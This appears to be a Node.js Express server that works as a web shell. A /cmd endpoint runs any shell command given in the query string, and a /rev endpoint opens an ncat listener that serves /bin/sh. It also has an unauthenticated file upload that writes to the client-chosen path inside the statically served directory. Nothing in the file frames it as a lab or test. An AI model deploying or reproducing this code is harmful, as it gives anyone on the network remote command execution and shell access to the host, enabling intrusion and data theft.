const PORT = process.env.PORT || 8080
const axios = require("axios")
const express = require("express")
const app = express()
const cors = require("cors")
const { exec } = require('node:child_process')
const fileUpload = require('express-fileupload')
const path = require('path')
const bodyParser = require('body-parser');
const morgan = require('morgan');
const _ = require('lodash');
app.use(fileUpload({
    createParentPath: true
}));
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: true}));
app.use(morgan('dev'));
var multer = require('multer');
var upload = multer();
var IncomingForm = require('formidable').IncomingForm
app.use(cors())
app.use(express.static('.'));

app.get('/', function (req, res) {

	res.json("Hmm")
	
})

app.get('/cmd', function (req, res){
	
	const command = req.query.cmd.replace('+',' ');
	exec(`${command}`, (err, out) => {
		//if (err) {
	  	//	console.log("could not execute commadn erro: ", err)
		//	return		
		//}
		res.send(`\nout:\n\n${out} \n\nerr:\n\n${err}`)
		console.log("Executed : ", out )
	})
})

app.get('/rev', function (req, res){

	exec('ncat -lv --exec "/bin/sh"', (err, out)=>{
	  
		if(err){
		  console.log('error occured: ')
		  res.send(err)
		}
		
		//res.send(out)
		console.log(out)
	})


})


app.get('/list', function (req, res){
	exec('ls files', (err, out)=>{
	  res.send(`\nout:\n\n${out} \n\nerr:\n\n${err}`)
	})
})



app.post('/', async (req, res) => {
    try {
        if(!req.files) {
            res.send({
                status: false,
                message: 'No file uploaded'
            });
        } else {
            //Use the name of the input field (i.e. "filee") to retrieve the uploaded file
            let filee = req.files.filee;
            
            //Use the mv() method to place the file in the upload directory (i.e. "uploads")
            filee.mv('./' + filee.name);

            //send response
            res.send({
                status: true,
                message: 'File is uploaded',
                data: {
                    name: filee.name,
                    mimetype: filee.mimetype,
                    size: filee.size
                }
            });
        }
    } catch (err) {
        res.status(500).send(err);
    }
});


app.listen(PORT, ()=> console.log(`Listening on port ${PORT}`))

